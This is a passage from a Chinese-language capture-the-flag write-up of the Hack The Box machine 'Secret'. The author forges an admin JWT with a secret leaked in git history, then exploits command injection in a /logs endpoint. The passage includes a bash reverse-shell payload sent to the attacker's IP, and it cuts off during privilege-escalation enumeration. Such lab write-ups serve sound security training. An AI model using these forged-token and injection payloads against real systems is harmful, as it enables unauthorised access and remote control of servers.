class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; git show 67d8da7 <br>commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78<br>Author: dasithsv &lt;dasithsv@gmail.com&gt;<br>Date:   Fri Sep 3 11:30:17 2021 +0530<br><br>    removed .<span class="hljs-built_in">env</span> <span class="hljs-keyword">for</span> security reasons<br><br>diff --git a/.env b/.env<br>index fb6f587..31db370 100644<br>--- a/.env<br>+++ b/.env<br>@@ -1,2 +1,2 @@<br> DB_CONNECT = <span class="hljs-string">&#x27;mongodb://127.0.0.1:27017/auth-web&#x27;</span><br>-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE<br>+TOKEN_SECRET = secret<br></code></pre></td></tr></table></figure><p>&#x2F;routes&#x2F;auth.js应该是在登录时候签发 JWT:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs json">router.post(&#x27;/login&#x27;<span class="hljs-punctuation">,</span> async  (req <span class="hljs-punctuation">,</span> res) =&gt; <span class="hljs-punctuation">&#123;</span><br><br>    const <span class="hljs-punctuation">&#123;</span> error <span class="hljs-punctuation">&#125;</span> = loginValidation(req.body)<br>    if (error) return res.status(<span class="hljs-number">400</span>).send(error.details<span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span>.message);<br><br>    <span class="hljs-comment">// check if email is okay </span><br>    const user = await User.findOne(<span class="hljs-punctuation">&#123;</span> email<span class="hljs-punctuation">:</span> req.body.email <span class="hljs-punctuation">&#125;</span>)<br>    if (!user) return res.status(<span class="hljs-number">400</span>).send(&#x27;Email is wrong&#x27;);<br><br>    <span class="hljs-comment">// check password </span><br>    const validPass = await bcrypt.compare(req.body.password<span class="hljs-punctuation">,</span> user.password)<br>    if (!validPass) return res.status(<span class="hljs-number">400</span>).send(&#x27;Password is wrong&#x27;);<br><br><br>    <span class="hljs-comment">// create jwt </span><br>    const token = jwt.sign(<span class="hljs-punctuation">&#123;</span> _id<span class="hljs-punctuation">:</span> user.id<span class="hljs-punctuation">,</span> name<span class="hljs-punctuation">:</span> user.name <span class="hljs-punctuation">,</span> email<span class="hljs-punctuation">:</span> user.email<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> process.env.TOKEN_SECRET )<br>    res.header(&#x27;auth-token&#x27;<span class="hljs-punctuation">,</span> token).send(token);<br><br><span class="hljs-punctuation">&#125;</span>)<br></code></pre></td></tr></table></figure><p>&#x2F;routes&#x2F;verifytoken.js是用来校验提交的令牌：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs json">const jwt = require(<span class="hljs-string">&quot;jsonwebtoken&quot;</span>);<br><br>module.exports = function (req<span class="hljs-punctuation">,</span> res<span class="hljs-punctuation">,</span> next) <span class="hljs-punctuation">&#123;</span><br>    const token = req.header(<span class="hljs-string">&quot;auth-token&quot;</span>);<br>    if (!token) return res.status(<span class="hljs-number">401</span>).send(<span class="hljs-string">&quot;Access Denied&quot;</span>);<br><br>    try <span class="hljs-punctuation">&#123;</span><br>        const verified = jwt.verify(token<span class="hljs-punctuation">,</span> process.env.TOKEN_SECRET);<br>        req.user = verified;<br>        next();<br>    <span class="hljs-punctuation">&#125;</span> catch (err) <span class="hljs-punctuation">&#123;</span><br>        res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">&quot;Invalid Token&quot;</span>);<br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>private.js是用来检测令牌权限：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs json">const router = require(&#x27;express&#x27;).Router();<br>const verifytoken = require(&#x27;./verifytoken&#x27;)<br>const User = require(&#x27;../model/user&#x27;);<br><br>router.get(&#x27;/priv&#x27;<span class="hljs-punctuation">,</span> verifytoken<span class="hljs-punctuation">,</span> (req<span class="hljs-punctuation">,</span> res) =&gt; <span class="hljs-punctuation">&#123;</span><br>   <span class="hljs-comment">// res.send(req.user)</span><br><br>    const userinfo = <span class="hljs-punctuation">&#123;</span> name<span class="hljs-punctuation">:</span> req.user <span class="hljs-punctuation">&#125;</span><br><br>    const name = userinfo.name.name;<br>    <br>    if (name == &#x27;theadmin&#x27;)<span class="hljs-punctuation">&#123;</span><br>        res.json(<span class="hljs-punctuation">&#123;</span><br>            creds<span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                role<span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span> <br>                username<span class="hljs-punctuation">:</span><span class="hljs-string">&quot;theadmin&quot;</span><span class="hljs-punctuation">,</span><br>                desc <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;welcome back admin,&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span>)<br>    <span class="hljs-punctuation">&#125;</span><br>    else<span class="hljs-punctuation">&#123;</span><br>        res.json(<span class="hljs-punctuation">&#123;</span><br>            role<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                role<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;you are normal user&quot;</span><span class="hljs-punctuation">,</span><br>                desc<span class="hljs-punctuation">:</span> userinfo.name.name<br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span>)<br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span>)<br></code></pre></td></tr></table></figure><p>它有一个&#x2F;log是管理员独属的，而且存在命令注入漏洞，对输入参数看起来没什么过滤便会调用exec执行：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs json">router.get(&#x27;/logs&#x27;<span class="hljs-punctuation">,</span> verifytoken<span class="hljs-punctuation">,</span> (req<span class="hljs-punctuation">,</span> res) =&gt; <span class="hljs-punctuation">&#123;</span><br>    const file = req.query.file;<br>    const userinfo = <span class="hljs-punctuation">&#123;</span> name<span class="hljs-punctuation">:</span> req.user <span class="hljs-punctuation">&#125;</span><br>    const name = userinfo.name.name;<br>    <br>    if (name == &#x27;theadmin&#x27;)<span class="hljs-punctuation">&#123;</span><br>        const getLogs = `git log --oneline $<span class="hljs-punctuation">&#123;</span>file<span class="hljs-punctuation">&#125;</span>`;<br>        exec(getLogs<span class="hljs-punctuation">,</span> (err <span class="hljs-punctuation">,</span> output) =&gt;<span class="hljs-punctuation">&#123;</span><br>            if(err)<span class="hljs-punctuation">&#123;</span><br>                res.status(<span class="hljs-number">500</span>).send(err);<br>                return<br>            <span class="hljs-punctuation">&#125;</span><br>            res.json(output);<br>        <span class="hljs-punctuation">&#125;</span>)<br>    <span class="hljs-punctuation">&#125;</span><br>    else<span class="hljs-punctuation">&#123;</span><br>        res.json(<span class="hljs-punctuation">&#123;</span><br>            role<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                role<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;you are normal user&quot;</span><span class="hljs-punctuation">,</span><br>                desc<span class="hljs-punctuation">:</span> userinfo.name.name<br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span>)<br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span>)<br><br>router.use(function (req<span class="hljs-punctuation">,</span> res<span class="hljs-punctuation">,</span> next) <span class="hljs-punctuation">&#123;</span><br>    res.json(<span class="hljs-punctuation">&#123;</span><br>        message<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><br>            message<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;404 page not found&quot;</span><span class="hljs-punctuation">,</span><br>            desc<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;page you are looking for is not found. &quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span>)<br><span class="hljs-punctuation">&#125;</span>);<br><br><br>module.exports = router<br></code></pre></td></tr></table></figure><p>我可以用自己令牌验证一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl -s <span class="hljs-string">&#x27;http://secret.htb/api/priv&#x27;</span> -H <span class="hljs-string">&quot;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjgwYzg0ZTNjYjI2YjA0NjQwZjA2MDgiLCJuYW1lIjoibW9zYWljIiwiZW1haWwiOiJtb3NhaWNAb3V0bG9vay5jb20iLCJpYXQiOjE2NTI2MDcxOTJ9.AxIpctQ-eyrU79TD3EK9IAcX9tCBRMosgrnxZFsmMOw&quot;</span> | jq .<br>&#123;<br>  <span class="hljs-string">&quot;role&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;you are normal user&quot;</span>,<br>    <span class="hljs-string">&quot;desc&quot;</span>: <span class="hljs-string">&quot;mosaic&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="制作JWT："><a href="#制作JWT：" class="headerlink" title="制作JWT："></a>制作JWT：</h3><p>可以看下这篇文章:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>pyjwt.readthedocs.io<span class="hljs-regexp">/en/</span><span class="hljs-number">2.0</span>.<span class="hljs-number">1</span>/usage.html<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;&gt; python                                           <br>Python <span class="hljs-number">3.9</span><span class="hljs-number">.12</span> (main, Mar <span class="hljs-number">24</span> <span class="hljs-number">2022</span>, <span class="hljs-number">13</span>:02:<span class="hljs-number">21</span>) <br>[GCC <span class="hljs-number">11.2</span><span class="hljs-number">.0</span>] on linux<br><span class="hljs-type">Type</span> <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;copyright&quot;</span>, <span class="hljs-string">&quot;credits&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;license&quot;</span> <span class="hljs-keyword">for</span> more information.<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> jwt<br><span class="hljs-meta">&gt;&gt;&gt; </span>token = <span class="hljs-string">&#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjgwYzg0ZTNjYjI2YjA0NjQwZjA2MDgiLCJuYW1lIjoibW9zYWljIiwiZW1haWwiOiJtb3NhaWNAb3V0bG9vay5jb20iLCJpYXQiOjE2NTI2MDcxOTJ9.AxIpctQ-eyrU79TD3EK9IAcX9tCBRMosgrnxZFsmMOw&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>secret = <span class="hljs-string">&#x27;gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>jwt.decode(token, secret, options=&#123;<span class="hljs-string">&quot;verify_signature&quot;</span>: <span class="hljs-literal">False</span>&#125;)<br>&#123;<span class="hljs-string">&#x27;_id&#x27;</span>: <span class="hljs-string">&#x27;6280c84e3cb26b04640f0608&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;mosaic&#x27;</span>, <span class="hljs-string">&#x27;email&#x27;</span>: <span class="hljs-string">&#x27;mosaic@outlook.com&#x27;</span>, <span class="hljs-string">&#x27;iat&#x27;</span>: <span class="hljs-number">1652607192</span>&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span>j = jwt.decode(token, secret, options=&#123;<span class="hljs-string">&quot;verify_signature&quot;</span>: <span class="hljs-literal">False</span>&#125;)<br><span class="hljs-meta">&gt;&gt;&gt; </span>j[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;theadmin&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>jwt.encode(j, secret)<br><span class="hljs-string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MjgwYzg0ZTNjYjI2YjA0NjQwZjA2MDgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im1vc2FpY0BvdXRsb29rLmNvbSIsImlhdCI6MTY1MjYwNzE5Mn0.uC47KV7Q2HRbAwB5PXibnPeo2E8gDXv_ZPNLTo1AJBg&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json">&gt;&gt; curl -s &#x27;http<span class="hljs-punctuation">:</span><span class="hljs-comment">//secret.htb/api/priv&#x27; -H &quot;auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MjgwYzg0ZTNjYjI2YjA0NjQwZjA2MDgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im1vc2FpY0BvdXRsb29rLmNvbSIsImlhdCI6MTY1MjYwNzE5Mn0.uC47KV7Q2HRbAwB5PXibnPeo2E8gDXv_ZPNLTo1AJBg&quot; | jq .</span><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;creds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;role&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;theadmin&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;desc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;welcome back admin&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>现在可以看一眼我觉得存在命令注入的地方：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json">if (name == &#x27;theadmin&#x27;)<span class="hljs-punctuation">&#123;</span><br>    const getLogs = `git log --oneline $<span class="hljs-punctuation">&#123;</span>file<span class="hljs-punctuation">&#125;</span>`;<br>    exec(getLogs<span class="hljs-punctuation">,</span> (err <span class="hljs-punctuation">,</span> output) =&gt;<span class="hljs-punctuation">&#123;</span><br>        if(err)<span class="hljs-punctuation">&#123;</span><br>            res.status(<span class="hljs-number">500</span>).send(err);<br>            return<br>        <span class="hljs-punctuation">&#125;</span><br>        res.json(output);<br>    <span class="hljs-punctuation">&#125;</span>)<br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>在我刚刚输入git log –oneline也能正常运行，那么我可以用 ; 分隔开：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl -s <span class="hljs-string">&#x27;http://secret.htb/api/logs?file=;ping+-c+1+10.10.16.6&#x27;</span> -H <span class="hljs-string">&quot;auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MjgwYzg0ZTNjYjI2YjA0NjQwZjA2MDgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im1vc2FpY0BvdXRsb29rLmNvbSIsImlhdCI6MTY1MjYwNzE5Mn0.uC47KV7Q2HRbAwB5PXibnPeo2E8gDXv_ZPNLTo1AJBg&quot;</span> | jq .<br><span class="hljs-string">&quot;80bf34c fixed typos 🎉\n0c75212 now we can view logs from server 😃\nab3e953 Added the codes\nPING 10.10.16.6 (10.10.16.6) 56(84) bytes of data.\n64 bytes from 10.10.16.6: icmp_seq=1 ttl=63 time=316 ms\n\n--- 10.10.16.6 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 316.039/316.039/316.039/0.000 ms\n&quot;</span><br></code></pre></td></tr></table></figure><p>确实能监听到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; sudo tcpdump -i tun0 icmp and src 10.10.11.120<br>tcpdump: verbose output suppressed, use -v[v]... <span class="hljs-keyword">for</span> full protocol decode<br>listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes<br>18:25:33.234043 IP secret.htb &gt; 10.10.16.6: ICMP <span class="hljs-built_in">echo</span> request, <span class="hljs-built_in">id</span> 1, <span class="hljs-built_in">seq</span> 1, length 64<br></code></pre></td></tr></table></figure><p>POST方法在传输过程中因为没有编码反弹shell的命令会被破坏，可以强制使用Get方式，并对命令进行编码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s -G <span class="hljs-string">&#x27;http://secret.htb/api/logs&#x27;</span> --data-urlencode <span class="hljs-string">&quot;file=&gt;/dev/null;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.6/9001 0&gt;&amp;1&#x27;&quot;</span> -H <span class="hljs-string">&quot;auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MjgwYzg0ZTNjYjI2YjA0NjQwZjA2MDgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im1vc2FpY0BvdXRsb29rLmNvbSIsImlhdCI6MTY1MjYwNzE5Mn0.uC47KV7Q2HRbAwB5PXibnPeo2E8gDXv_ZPNLTo1AJBg&quot;</span> | jq -r .<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; nc -lvnp 9001<br>listening on [any] 9001 ...<br>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.120] 32932<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1124): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>dasith@secret:~/local-web$ <br></code></pre></td></tr></table></figure><p>获取user.txt：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">dasith@secret:~/local-web$ <span class="hljs-built_in">ls</span><br>index.js  node_modules  package-lock.json  routes  validations.js<br>model     package.json  public             src<br>dasith@secret:~/local-web$ <span class="hljs-built_in">cd</span> ~<br>dasith@secret:~$ <span class="hljs-built_in">ls</span><br>local-web  user.txt<br>dasith@secret:~$ <span class="hljs-built_in">cat</span> suer<br><span class="hljs-built_in">cat</span>: suer: No such file or directory<br>dasith@secret:~$ <span class="hljs-built_in">cat</span> user.txt <br>0bb.............................<br></code></pre></td></tr></table></figure><h3 id="提权枚举："><a href="#提权枚举：" class="headerlink" title="提权枚举："></a>提权枚举：</h3><p>当前用户目录是空的，在&#x2F;opt下有一些文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">dasith@secret:/opt$ <span class="hljs-built_in">ls</span><br>code.c  count  valgrind.log<br>dasith@secret:/opt$ <span class="hljs-built_in">cat</span> code.c<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dirent.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/limits.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">dircount</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">char</span> *summary)</span><br>&#123;<br>    DIR *dir;<br>    <span class="hljs-type">char</span> fullpath[PATH_MAX];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dirent</span> *<span class="hljs-title">ent</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">fstat</span>;</span><br><br>    <span class="hljs-type">int</span> tot = <span class="hljs-number">0</span>, regular_files = <span class="hljs-number">0</span>, directories = <span class="hljs-number">0</span>, symlinks = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span>((dir = opendir(path)) == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nUnable to open directory.\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-keyword">while</span> ((ent = readdir(dir)) != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        ++tot;<br>        <span class="hljs-built_in">strncpy</span>(fullpath, path, PATH_MAX-NAME_MAX<span class="hljs-number">-1</span>);<br>        <span class="hljs-built_in">strcat</span>(fullpath, <span class="hljs-string">&quot;/&quot;</span>);<br>        <span class="hljs-built_in">strncat</span>(fullpath, ent-&gt;d_name, <span class="hljs-built_in">strlen</span>(ent-&gt;d_name));<br>        <span class="hljs-keyword">if</span> (!lstat(fullpath, &amp;fstat))<br>        &#123;<br>            <span class="hljs-keyword">if</span>(S_ISDIR(fstat.st_mode))<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;d&quot;</span>);<br>                ++directories;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(S_ISLNK(fstat.st_mode))<br>            &#123;<br>                <span 